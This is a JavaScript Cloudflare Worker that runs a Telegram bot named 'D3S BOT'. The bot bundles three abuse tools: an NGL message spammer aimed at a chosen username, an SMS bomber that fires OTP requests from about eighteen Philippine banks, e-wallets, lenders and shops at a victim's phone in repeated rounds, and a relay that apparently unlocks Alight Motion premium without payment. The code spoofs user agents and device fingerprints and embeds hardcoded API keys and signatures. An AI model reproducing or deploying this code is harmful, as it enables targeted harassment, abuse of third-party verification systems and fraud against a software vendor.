/* ============================================================================
   D3S TELEGRAM BOT — v3.1
   Telegram-native · GIF header · quick commands · no captcha upstream
   ============================================================================ */

/* ------------------------------------------------------------------ CONFIG */

const VERSION = 'tg-v3.1';
const START_TIME = Date.now();

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

const VERCEL_RELAY  = 'https://nglspammer2.vercel.app/api/relay';
const VERCEL_SMS    = 'https://sms-jsiej.vercel.app/api/sms';
const VERCEL_AM     = 'https://am-premium-eight.vercel.app/api/am';
const BYPASS_PROXY  = 'https://bypass-proxy.marcelochristann.workers.dev';

const GIF_URL      = 'https://i.imgur.com/PadgzEK.gif';

/* -------------------------------------------------------------- UTILITIES */

const UA_LIST = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
];

const pickUA = () => UA_LIST[Math.floor(Math.random() * UA_LIST.length)];

const uuid = () =>
  'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = (Math.random() * 16) | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });

const randHex    = (n) => { let s = ''; while (s.length < n) s += Math.floor(Math.random() * 16).toString(16); return s.slice(0, n); };
const randAlpha  = (n) => { const c = 'abcdefghijklmnopqrstuvwxyz0123456789'; let r = ''; for (let i = 0; i < n; i++) r += c[Math.floor(Math.random() * c.length)]; return r; };
const randGmail  = () => randAlpha(8) + '@gmail.com';
const randUid    = () => randAlpha(28);
const randDevice = () => randAlpha(16);

const normPhone = (p) => {
  p = String(p).replace(/\s/g, '');
  if (p.startsWith('0')) return '+63' + p.slice(1);
  if (p.startsWith('63') && !p.startsWith('+63')) return '+' + p;
  if (!p.startsWith('+63') && p.length === 10) return '+63' + p;
  if (!p.startsWith('+')) return '+63' + p;
  return p;
};

const json = (data, status = 200) =>
  new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS, 'Content-Type': 'application/json; charset=utf-8', 'X-Worker-Version': VERSION },
  });

const sleep = (ms) => new Promise(res => setTimeout(res, ms));

function formatUptime(ms) {
  const sec = Math.floor(ms / 1000);
  const d = Math.floor(sec / 86400);
  const h = Math.floor((sec % 86400) / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = sec % 60;
  const parts = [];
  if (d) parts.push(d + 'd');
  if (h) parts.push(h + 'h');
  if (m) parts.push(m + 'm');
  parts.push(s + 's');
  return parts.join(' ');
}

async function post(url, headers, body, timeoutMs = 8000) {
  try {
    const ctrl = new AbortController();
    const to = setTimeout(() => ctrl.abort(), timeoutMs);
    const r = await fetch(url, { method: 'POST', headers: headers || {}, body, signal: ctrl.signal });
    clearTimeout(to);
    await r.text().catch(() => {});
    return { status: r.status };
  } catch (e) {
    return { status: 0, error: String(e) };
  }
}

/* ---------------------------------------------------------- TELEGRAM SEND */

async function tgCall(env, method, payload) {
  const url = `https://api.telegram.org/bot${env.TG_BOT_TOKEN}/${method}`;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const j = await r.json();
    if (!j.ok) console.error('tgCall failed', method, JSON.stringify(j));
    return j;
  } catch (e) {
    console.error('tgCall exception', method, String(e));
    return { ok: false, error: String(e) };
  }
}

async function sendText(env, chat_id, text) {
  return tgCall(env, 'sendMessage', {
    chat_id,
    text: String(text).slice(0, 4000),
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  });
}

async function sendGif(env, chat_id) {
  return tgCall(env, 'sendAnimation', {
    chat_id,
    animation: GIF_URL,
    caption: 'D3S BOT · ' + VERSION,
  });
}

/* GIF then text — the classic header flow */
async function sendHeaderAndText(env, chat_id, text) {
  await sendGif(env, chat_id);
  await sleep(500);
  await sendText(env, chat_id, text);
}

/* -------------------------------------------------------------- NGL ENGINE */

async function nglCloudflare(username, message) {
  const nonce = Date.now() + '-' + Math.floor(Math.random() * 1e9);
  const apiUrl = 'https://ngl.link/api/submit?_=' + nonce;
  const payload = new URLSearchParams({
    username, question: message, deviceId: uuid(), gameSlug: '', referrer: '',
  }).toString();
  const h = new Headers();
  h.set('Accept', '*/*');
  h.set('Accept-Language', 'en-US,en;q=0.9');
  h.set('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
  h.set('X-Requested-With', 'XMLHttpRequest');
  h.set('Origin', 'https://ngl.link');
  h.set('Referer', 'https://ngl.link/' + username);
  h.set('User-Agent', pickUA());
  try {
    const r = await fetch(apiUrl, { method: 'POST', headers: h, body: payload });
    const text = (await r.text()).slice(0, 300);
    return { ok: r.status === 200, status: r.status, body: text, error: '', via: 'cf' };
  } catch (e) {
    return { ok: false, status: 0, body: '', error: String(e), via: 'cf' };
  }
}

async function nglVercel(username, message) {
  try {
    const r = await fetch(VERCEL_RELAY, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, message }),
    });
    const j = await r.json();
    return { ok: !!j.ok, status: j.status || 0, body: j.body || '', error: j.error || '', via: 'vc' };
  } catch (e) {
    return { ok: false, status: 0, body: '', error: String(e), via: 'vc' };
  }
}

async function nglSend(username, message) {
  const cf = await nglCloudflare(username, message);
  if (cf.status === 200) return cf;
  const vc = await nglVercel(username, message);
  if (vc.status === 200) return vc;
  return cf;
}

async function nglBatch(username, count, message) {
  const stats = { sent: 0, fof: 0, blk: 0, err: 0, via_cf: 0, via_vc: 0, start: Date.now() };
  const n = Math.min(count, 50);
  for (let i = 0; i < n; i++) {
    const r = await nglSend(username, message);
    if (r.status === 200) { stats.sent++; if (r.via === 'cf') stats.via_cf++; else if (r.via === 'vc') stats.via_vc++; }
    else if (r.status === 404) stats.fof++;
    else if (r.status === 429) stats.blk++;
    else stats.err++;
    if (i < n - 1) await sleep(200);
  }
  stats.elapsed = ((Date.now() - stats.start) / 1000).toFixed(1);
  return stats;
}

/* -------------------------------------------------------------- SMS ENGINE */

async function svcCustom(phone, sender, msg) {
  const norm = normPhone(phone);
  const suffix = '-freed0m';
  const text = msg.endsWith(suffix) ? msg : msg + ' ' + suffix;
  const cmd = JSON.stringify(['free.text.sms', '421', norm, '2207117BPG',
    'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg', text]);
  const body = new URLSearchParams({
    UID: randUid(), humottaee: 'Processing', Email: randGmail(),
    '$Oj0O%K7zi2j18E': cmd, device_id: randDevice(),
    Photo: 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
    Name: sender || 'User',
  }).toString();
  const r = await post('https://sms.m2techtronix.com/v13/sms.php',
    { 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15)', 'Content-Type': 'application/x-www-form-urlencoded' }, body);
  return r.status === 200;
}

async function svcEzloan(phone) {
  const r = await post('https://gateway.ezloancash.ph/security/auth/otp/request',
    { 'User-Agent': 'okhttp/4.9.2', 'Content-Type': 'application/json' },
    JSON.stringify({ businessId: 'EZLOAN', contactNumber: phone, appsflyerIdentifier: '1760444943092-3966994042140191452' }));
  return r.status === 200;
}

async function svcXpress(phone, batch) {
  const p = phone.startsWith('+63') ? phone : '+63' + phone.replace(/^0/, '');
  const r = await post('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
    { 'User-Agent': 'Dalvik/2.1.0', 'Content-Type': 'application/json' },
    JSON.stringify({ FirstName: 'user', LastName: 'test', Email: `user${Date.now()}_${batch}@gmail.com`,
      Phone: p, Password: 'Pass1234', ConfirmPassword: 'Pass1234',
      FingerprintVisitorId: 'TPt0yCuOFim3N3rzvrL1', FingerprintRequestId: '1757149666261.Rr1VvG' }));
  return r.status === 200;
}

async function svcAbenson(phone) {
  const body = new URLSearchParams({ contact_no: phone, login_token: 'undefined' }).toString();
  const r = await post('https://api.mobile.abenson.com/api/public/membership/activate_otp',
    { 'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded' }, body);
  return r.status === 200;
}

async function svcExcellent(phone) {
  const coords = [{ lat: '14.5995', long: '120.9842' }, { lat: '14.6760', long: '121.0437' }];
  const c = coords[Math.floor(Math.random() * coords.length)];
  const r = await post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
    { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json; charset=utf-8', 'x-latitude': c.lat, 'x-longitude': c.long },
    JSON.stringify({ domain: phone, cat: 'login', previous: false, financial: 'efe35521e51f924efcad5d61d61072a9' }));
  return r.status === 200;
}

async function svcFortune(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
    { 'User-Agent': 'Dart/3.6 (dart:io)', 'Content-Type': 'application/json', 'app-type': 'GOOGLE_PLAY', 'authorization': 'Bearer' },
    JSON.stringify({ deviceId: 'c31a9bc0-652d-11f0-88cf-9d4076456969', deviceType: 'GOOGLE_PLAY', companyId: '4bf735e97269421a80b82359e7dc2288', dialCode: '+63', phoneNumber: p }));
  return r.status === 200;
}

async function svcWemove(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.wemove.com.ph/auth/users',
    { 'User-Agent': 'okhttp/4.9.3', 'Content-Type': 'application/json', 'xuid_type': 'user', 'source': 'customer', 'authorization': 'Bearer' },
    JSON.stringify({ phone_country: '+63', phone_no: p }));
  return r.status === 200;
}

async function svcLbc(phone) {
  const p = phone.replace(/^0/, '');
  const body = new URLSearchParams({ verification_type: 'mobile', client_email: randGmail(),
    client_contact_code: '+63', client_contact_no: p, app_log_uid: randHex(16) }).toString();
  const r = await post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
    { 'User-Agent': 'Dart/2.19 (dart:io)', 'Content-Type': 'application/x-www-form-urlencoded' }, body);
  return r.status === 200;
}

async function svcPickup(phone) {
  const p = phone.startsWith('+63') ? phone : '+63' + phone.replace(/^0/, '');
  const r = await post('https://production.api.pickup-coffee.net/v2/customers/login',
    { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json' },
    JSON.stringify({ mobile_number: p, login_method: 'mobile_number' }));
  return r.status === 200;
}

async function svcHoney(phone) {
  const r = await post('https://api.honeyloan.ph/api/client/registration/step-one',
    { 'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json' },
    JSON.stringify({ phone, is_rights_block_accepted: 1 }));
  return r.status === 200;
}

async function svcKomo(phone) {
  const r = await post('https://api.komo.ph/api/otp/v5/generate',
    { 'Content-Type': 'application/json', 'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==', 'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba' },
    JSON.stringify({ mobile: phone, transactionType: 6 }));
  return r.status === 200;
}

async function svcS5(phone) {
  const p = normPhone(phone);
  const body = new URLSearchParams({ phone_number: p }).toString();
  const r = await post('https://api.s5.com/player/api/v1/otp/request',
    { accept: 'application/json, text/plain, */*', 'content-type': 'multipart/form-data;', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36' }, body);
  return r.status === 200;
}

async function svcGrab(phone) {
  const p = phone.startsWith('+63') ? phone : '+63' + phone.replace(/^0/, '');
  const r = await post('https://api.grab.com/grabid/v1/phone/otp',
    { 'User-Agent': 'Grab/5.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ phoneNumber: p, countryCode: 'PH', channel: 'SMS' }));
  return r.status === 200;
}

async function svcLazada(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.lazada.com.ph/rest/account/sendOtp',
    { 'User-Agent': 'Lazada/8.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ mobile: p, countryCode: '63' }));
  return r.status === 200;
}

async function svcShopee(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://shopee.ph/api/v4/account/request_otp',
    { 'User-Agent': 'Shopee/2.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ phone: p, country: 'PH' }));
  return r.status === 200;
}

async function svcPayMaya(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.paymaya.com/v2/otp/send',
    { 'User-Agent': 'PayMaya/4.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ mobileNumber: p, channel: 'sms' }));
  return r.status === 200;
}

async function svcCoinsPH(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.coins.ph/v2/otp/request',
    { 'User-Agent': 'Coins.ph/3.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ phone: p, type: 'login' }));
  return r.status === 200;
}

async function svcBPI(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.bpi.com.ph/otp/send',
    { 'User-Agent': 'BPI/2.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ phoneNumber: p, channel: 'SMS' }));
  return r.status === 200;
}

const SMS_SERVICES = {
  'Custom SMS': svcCustom, 'EZLoan': svcEzloan, 'Xpress PH': svcXpress,
  'Abenson': svcAbenson, 'Excellent Lending': svcExcellent, 'Fortune Pay': svcFortune,
  'WeMove': svcWemove, 'LBC Connect': svcLbc, 'Pickup Coffee': svcPickup,
  'Honey Loan': svcHoney, 'Komo PH': svcKomo, 'S5.com': svcS5,
  'Grab PH': svcGrab, 'Lazada PH': svcLazada, 'Shopee PH': svcShopee,
  'PayMaya': svcPayMaya, 'Coins.ph': svcCoinsPH, 'BPI Bank': svcBPI,
};
const SMS_NAMES = Object.keys(SMS_SERVICES);

async function smsCloudflare(phone, services, rounds, sender, msg) {
  const stats = { ok: 0, fail: 0, rounds: 0, start: Date.now(), svc: {}, via: 'cf' };
  const maxRounds = Math.min(rounds, 20);
  for (const s of services) stats.svc[s] = { ok: 0, fail: 0 };
  for (let r = 0; r < maxRounds; r++) {
    const tasks = []; const names = [];
    for (const svc of services) {
      const fn = SMS_SERVICES[svc];
      if (!fn) continue;
      const p = svc === 'Custom SMS' ? fn(phone, sender || 'User', msg || 'Test')
             : svc === 'Xpress PH'  ? fn(phone, r + 1)
             : fn(phone);
      tasks.push(p); names.push(svc);
    }
    const results = await Promise.allSettled(tasks);
    for (let i = 0; i < results.length; i++) {
      const ok = results[i].status === 'fulfilled' && results[i].value === true;
      if (ok) { stats.ok++; stats.svc[names[i]].ok++; }
      else    { stats.fail++; stats.svc[names[i]].fail++; }
    }
    stats.rounds++;
    if (r < maxRounds - 1) await sleep(1200);
  }
  stats.elapsed = ((Date.now() - stats.start) / 1000).toFixed(1);
  return stats;
}

async function smsVercel(phone, services, rounds, sender, msg) {
  try {
    const indices = services.map(s => SMS_NAMES.indexOf(s) + 1).filter(n => n > 0);
    const r = await fetch(VERCEL_SMS, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone, services: indices, rounds, sender, message: msg }),
    });
    const j = await r.json();
    if (j && typeof j.sent === 'number') {
      return { ok: j.sent || 0, fail: j.fail || 0, rounds: j.rounds || rounds, elapsed: j.elapsed || '0', svc: j.per_service || {}, via: 'vc' };
    }
  } catch (e) {}
  return null;
}

async function smsBatch(phone, services, rounds, sender, msg) {
  const cf = await smsCloudflare(phone, services, rounds, sender, msg);
  if (cf.ok > 0) return cf;
  const vc = await smsVercel(phone, services, rounds, sender, msg);
  if (vc) return vc;
  return cf;
}

/* -------------------------------------------------------------- AM */

async function amSendMagicLink(email) {
  try {
    const r = await fetch(VERCEL_AM, { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'send-magiclink', email }) });
    const j = await r.json();
    return { ok: !!j.ok, status: j.status || 0, upstream: j.upstream || {}, relay: j.relay || 'vercel' };
  } catch (e) {
    return { ok: false, status: 0, upstream: { error: String(e) }, relay: 'vercel' };
  }
}

async function amVerify(email, rawLink) {
  try {
    const r = await fetch(VERCEL_AM, { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'verify-account', email, rawLink }) });
    const j = await r.json();
    const up = j.upstream || {};
    const idToken = up.idToken || (up.profile && up.profile.idToken);
    return { ok: !!j.ok, status: j.status || 0, idToken, upstream: up, relay: j.relay || 'vercel' };
  } catch (e) {
    return { ok: false, status: 0, idToken: null, upstream: { error: String(e) }, relay: 'vercel' };
  }
}

async function amApply(email, idToken) {
  try {
    const r = await fetch(VERCEL_AM, { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'apply-premium', email, idToken }) });
    const j = await r.json();
    return { ok: !!j.ok, status: j.status || 0, upstream: j.upstream || {}, relay: j.relay || 'vercel' };
  } catch (e) {
    return { ok: false, status: 0, upstream: { error: String(e) }, relay: 'vercel' };
  }
}

/* -------------------------------------------------------------- COMMANDS */

function commandsText() {
  const up = formatUptime(Date.now() - START_TIME);
  return `D3S BOT ${VERSION}
uptime ${up}

<b>NGL</b>
  test &lt;user&gt;
  spam &lt;user&gt; &lt;count&gt; &lt;msg&gt;

<b>SMS</b>
  sms &lt;phone&gt; [count]
  smssvc &lt;phone&gt; 1,2,3
  smshelp

<b>AM</b>
  am &lt;email&gt;
  amverify &lt;email&gt; &lt;link&gt;

<b>MISC</b>
  /start
  /menu
  /info
  /ping`;
}

async function handleCommand(env, chat_id, text) {
  const raw = (text || '').trim();
  const lower = raw.toLowerCase();
  if (!raw) return;

  /* MENU */
  if (lower === '/start' || lower === '/menu' || lower === 'menu' || lower === 'start') {
    return sendHeaderAndText(env, chat_id, commandsText());
  }

  /* INFO */
  if (lower === '/info' || lower === '/help' || lower === 'info' || lower === 'help') {
    return sendHeaderAndText(env, chat_id, commandsText());
  }

  if (lower === '/ping' || lower === 'ping') {
    const up = formatUptime(Date.now() - START_TIME);
    return sendText(env, chat_id, `PONG ${new Date().toISOString()}\nuptime ${up}`);
  }

  if (raw === '..') {
    const up = formatUptime(Date.now() - START_TIME);
    return sendText(env, chat_id, `DEEP STATUS\n  ver ${VERSION}\n  uptime ${up}`);
  }

  if (/^https?:\/\//i.test(raw)) {
    return sendHeaderAndText(env, chat_id, 'Link received:\n' + raw);
  }

  if (lower.startsWith('test ')) {
    const user = raw.split(/\s+/)[1];
    if (!user) return sendText(env, chat_id, 'USAGE: test <user>');
    await sendText(env, chat_id, 'TESTING NGL: ' + user);
    const r = await nglSend(user, 'bot-preflight');
    if (r.status === 200) return sendHeaderAndText(env, chat_id, `NGL VALID\n  target ${user}\n  relay ${r.via}`);
    if (r.status === 404) return sendHeaderAndText(env, chat_id, `NGL NOT FOUND\n  target ${user}`);
    return sendHeaderAndText(env, chat_id, `NGL HTTP ${r.status}`);
  }

  if (lower.startsWith('spam ')) {
    const parts = raw.split(/\s+/);
    if (parts.length < 4) return sendText(env, chat_id, 'USAGE: spam <user> <count> <msg>');
    const user = parts[1];
    const count = parseInt(parts[2], 10);
    const message = parts.slice(3).join(' ');
    if (!count || count < 1 || count > 50) return sendText(env, chat_id, 'ERROR: count 1-50');
    await sendText(env, chat_id, `NGL BATCH START\n  target ${user}\n  count ${count}`);
    const stats = await nglBatch(user, count, message);
    return sendHeaderAndText(env, chat_id,
      `NGL DONE\n  sent    ${stats.sent}  (cf ${stats.via_cf} / vc ${stats.via_vc})\n` +
      `  404     ${stats.fof}\n  errors  ${stats.err}\n  elapsed ${stats.elapsed}s`);
  }

  if (lower === 'smshelp') {
    let out = `SMS SERVICES (${SMS_NAMES.length})\n`;
    SMS_NAMES.forEach((n, i) => { out += `  ${i + 1}. ${n}\n`; });
    out += `\nUSAGE\n  sms <phone> <count>\n  smssvc <phone> 1,3,8`;
    return sendHeaderAndText(env, chat_id, out);
  }

  if (lower.startsWith('smssvc ')) {
    const parts = raw.split(/\s+/);
    if (parts.length < 3) return sendText(env, chat_id, 'USAGE: smssvc <phone> <1,2,3>');
    const phone = parts[1];
    const idx = parts[2].split(',').map(s => parseInt(s.trim(), 10)).filter(n => n >= 1 && n <= SMS_NAMES.length);
    if (!idx.length) return sendText(env, chat_id, 'ERROR: bad service numbers');
    const services = idx.map(i => SMS_NAMES[i - 1]);
    await sendText(env, chat_id, 'SMS SELECTED\n  svc ' + services.join(', '));
    const stats = await smsBatch(phone, services, 1, 'User', 'Test');
    return sendHeaderAndText(env, chat_id, `SMS DONE\n  sent ${stats.ok} (${stats.via || 'cf'})\n  fail ${stats.fail}`);
  }

  if (lower.startsWith('sms ')) {
    const parts = raw.split(/\s+/);
    if (parts.length < 2) return sendText(env, chat_id, 'USAGE: sms <phone> [count]');
    const phone = parts[1];
    const rounds = parts[2] ? Math.max(1, Math.min(20, parseInt(parts[2], 10) || 1)) : 1;
    const norm = normPhone(phone);
    if (!/^\+\d{10,15}$/.test(norm)) return sendText(env, chat_id, 'ERROR: invalid phone');
    await sendText(env, chat_id, `SMS BATCH START\n  phone ${phone}\n  rounds ${rounds}`);
    const stats = await smsBatch(phone, SMS_NAMES, rounds, 'User', 'Test');
    return sendHeaderAndText(env, chat_id,
      `SMS DONE\n  rounds ${stats.rounds}\n  sent ${stats.ok} (${stats.via || 'cf'})\n  fail ${stats.fail}`);
  }

  if (lower === 'amhelp') {
    return sendHeaderAndText(env, chat_id,
      'ALIGHT MOTION FLOW\n\nSTEP 1\n  am <email>\n  -> magic link sent\n\nSTEP 2\n  open email, copy link\n\nSTEP 3\n  amverify <email> <link>');
  }

  if (lower.startsWith('amverify ')) {
    const parts = raw.split(/\s+/);
    if (parts.length < 3) return sendText(env, chat_id, 'USAGE: amverify <email> <link>');
    const email = parts[1];
    const rawLink = parts.slice(2).join(' ');
    await sendText(env, chat_id, 'AM VERIFY\n  email ' + email);
    const v = await amVerify(email, rawLink);
    if (!v.idToken) return sendHeaderAndText(env, chat_id, 'AM VERIFY FAILED\n  ' + JSON.stringify(v.upstream).slice(0, 200));
    await sendText(env, chat_id, 'VERIFIED. activating premium...');
    const a = await amApply(email, v.idToken);
    if (a.upstream && a.upstream.success) {
      return sendHeaderAndText(env, chat_id, `AM PREMIUM ACTIVE\n  email ${email}\n  status ACTIVE`);
    }
    return sendHeaderAndText(env, chat_id, 'AM PREMIUM FAILED\n  ' + JSON.stringify(a.upstream).slice(0, 200));
  }

  if (lower.startsWith('am ')) {
    const email = raw.split(/\s+/)[1];
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return sendText(env, chat_id, 'USAGE: am <email>');
    await sendText(env, chat_id, 'AM SEND LINK\n  email ' + email);
    const r = await amSendMagicLink(email);
    if (r.upstream && r.upstream.success) {
      return sendHeaderAndText(env, chat_id, `AM LINK SENT\n  email ${email}\n  check inbox/spam\n\nNEXT: amverify ${email} <link>`);
    }
    return sendHeaderAndText(env, chat_id, 'AM FAILED\n  ' + JSON.stringify(r.upstream).slice(0, 200));
  }

  if (lower.startsWith('bypass ')) {
    return sendText(env, chat_id,
      'BYPASS unavailable.\nUpstream gateways are captcha-protected.\nOpen the link manually in your browser.');
  }

  return sendHeaderAndText(env, chat_id, 'Unknown command. Send /menu.');
}

/* -------------------------------------------------------------- HTTP ROUTER */

export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);

      if (request.method === 'OPTIONS') {
        return new Response(null, { status: 204, headers: { ...CORS, 'X-Worker-Version': VERSION } });
      }

      /* Telegram webhook */
      if (url.pathname === '/tg/webhook' && request.method === 'POST') {
        const raw = await request.text();
        let data;
        try { data = JSON.parse(raw); } catch { return new Response('bad json', { status: 400 }); }

        // Optional: verify secret token header set via setWebhook?secret_token=...
        // if (env.TG_WEBHOOK_SECRET && request.headers.get('X-Telegram-Bot-Api-Secret-Token') !== env.TG_WEBHOOK_SECRET) {
        //   return new Response('forbidden', { status: 403 });
        // }

        const msg = (data.message || data.edited_message || data.channel_post);
        if (msg) {
          const chat_id = msg.chat && msg.chat.id;
          const text = (msg.text || '').toString();
          if (chat_id && text) {
            ctx.waitUntil(handleCommand(env, chat_id, text));
          }
        }
        return new Response('OK', { status: 200 });
      }

      /* Diagnostics */
      if (url.pathname === '/tg/diag' && request.method === 'GET') {
        return json({
          ok: true,
          version: VERSION,
          uptime: formatUptime(Date.now() - START_TIME),
          has_bot_token: !!env.TG_BOT_TOKEN,
          gif_url: GIF_URL,
          ts: Date.now(),
        });
      }

      /* Manual test send: /tg/test?chat=123 */
      if (url.pathname === '/tg/test' && request.method === 'GET') {
        const chat = url.searchParams.get('chat');
        if (!chat) return json({ ok: false, msg: 'pass ?chat=...' }, 400);
        const r = await sendText(env, chat, 'Test ' + new Date().toISOString());
        return json(r);
      }

      /* Manual NGL relay for testing */
      if (url.pathname === '/api') {
        if (request.method !== 'POST') return json({ ok: false, msg: 'POST only' }, 405);
        let body = {};
        try {
          const ct = request.headers.get('content-type') || '';
          if (ct.includes('application/json')) body = await request.json();
          else body = Object.fromEntries(new URLSearchParams(await request.text()));
        } catch (e) {
          return json({ ok: false, msg: 'bad body', error: String(e) }, 400);
        }
        const username = String(body.username || '').trim();
        const message = String(body.message || 'Hi');
        if (!username || username.includes('/') || username.includes(' ')) {
          return json({ ok: false, msg: 'bad username' }, 400);
        }
        const r = await nglSend(username, message);
        return json(r);
      }

      return json({ ok: false, msg: 'not found' }, 404);
    } catch (outer) {
      return new Response(JSON.stringify({
        ok: false, msg: 'worker exception', error: String(outer), version: VERSION,
      }), {
        status: 500,
        headers: { ...CORS, 'Content-Type': 'application/json', 'X-Worker-Version': VERSION },
      });
    }
  },
};